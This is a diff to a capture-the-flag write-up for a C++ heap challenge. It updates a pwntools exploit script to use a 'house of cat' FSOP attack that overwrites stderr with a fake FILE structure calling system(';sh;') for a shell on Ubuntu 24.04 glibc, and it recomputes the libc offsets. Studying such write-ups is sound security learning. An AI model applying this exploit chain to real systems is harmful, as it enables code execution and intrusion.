@@ -87,7 +87,8 @@ When you read C++ source code, new allocate chunk didn't clear its chunk memory.
 And it check index by capacity, so we can access this fake pointer(If we don't have UAF, when you add new schedule, your fake pointer will be overwritten).
 OK, So we will get arbitrary write on libc (std::string).
 
-We write FSOP on stderr. And when this binary exit, We will get shell.
+We use house of cat (FSOP) and overwrite stderr. And when this binary exit, We will get shell.
+PS: patch libc let you can success exploit on glibc 24.04
 
 If you don't understand, go to read my script.
 
@@ -171,11 +172,12 @@ delete(0)
 
 show(0)
 r.recvuntil(b'] is ')
-leaklibc = u64(r.recvline().strip()[:6].ljust(8,b'\x00'))
-libcbase = leaklibc - 0x21ace0
+leaklibc = (u64(r.recvline().strip()[:6].ljust(8,b'\x00')) << 8 ) + 0x20
+libcbase = leaklibc - 0x203b20
 
-IO_STDERR = libcbase + 0x21b6a0
-libc_system = libcbase + 0x50d70 
+
+IO_STDERR = libcbase + 0x2044e0
+libc_system = libcbase + 0x58740
 
 payload1  = p64(0xaabbccdd) + p64(0) + p64(0) + p64(0)
 payload1 += p64(0xaabbccdd) + p64(0) + p64(0) + p64(0)
@@ -189,10 +191,34 @@ add(b'Tomorin')
 add(b'Soyorin')
 add(b'Rana')
 
-payload2 =  p32(0xfbad0101) + b";sh\x00" + b'\x00' * (0x50) + p64(libc_system) + b'\x00' * (0x28) + p64(IO_STDERR - 0x10) + b'\x00' * (0x10) + p64(IO_STDERR - 0x10) + b'\x00' * 0x18 + p32(1) + b'\x00' * (0xc) + p64(IO_STDERR - 0x10) + p64(libcbase + 0x217078) 
+libc_IO_wfile_jumps = libcbase + 0x202228
+emptylibc = libcbase + 0x204bc0
+fakew_data = IO_STDERR
+fake_wow = IO_STDERR + 0x18
+
+payload2  = b"\xd0\x06;sh;".ljust(8, b"\x00") # _flags
+
+payload2  = payload2.ljust(0x20, b"\x00")
+payload2 += p64(1)
+payload2  = payload2.ljust(0x30, b"\x00")
+payload2 += p64(libc_system)
+payload2  = payload2.ljust(0x70, b"\x00")
+payload2 += p32(2)
+payload2  = payload2.ljust(0x78, b"\x00")
+payload2 += p64(0xffffffffffffffff)
+payload2  = payload2.ljust(0x88, b"\x00")
+payload2 += p64(emptylibc) + p64(0xffffffffffffffff)
+payload2  = payload2.ljust(0xa0, b"\x00")
+payload2 += p64(fakew_data) 
+payload2  = payload2.ljust(0xc0, b"\x00")
+payload2 += p32(1)
+payload2  = payload2.ljust(0xd8, b"\x00")
+payload2 += p64(libc_IO_wfile_jumps + 0x30) + p64(fake_wow)
 
 edit(3, payload2)
-exitf()
+
+
+sl(b"5")
 
 NAUPINFO("LEAKLIBC", hex(leaklibc))
 NAUPINFO("LIBCBASE", hex(libcbase))
@@ -200,6 +226,8 @@ NAUPINFO('STD ERROR', hex(IO_STDERR))
 ### interactive
 ita()
 ```
+
+
 
 
 
